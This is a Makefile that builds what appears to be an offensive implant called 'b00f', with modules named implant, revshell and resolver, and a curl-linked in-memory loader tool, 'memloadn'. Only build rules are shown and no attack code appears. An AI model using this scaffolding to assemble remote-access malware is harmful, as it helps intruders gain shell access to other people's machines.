# -*- Makefile -*-

#target: dependencies
#	action

all: boof tools

boof: implant.o die.o resolver.o uuid.o revshell.o
	cc implant.o die.o resolver.o uuid.o revshell.o -o b00f

implant.o: implant.c
	cc -c implant.c -o implant.o

die.o: die.c
	cc -c die.c

resolver.o: resolver.c
	cc -c resolver.c

uuid.o: uuid.c
	cc -c uuid.c

revshell.o: revshell.c
	cc -c revshell.c

tools: memloadn

memloadn: b00floadn.c
	cc b00floadn.c -o tools/memloadn -l curl

clean:
	rm *.o b00f 

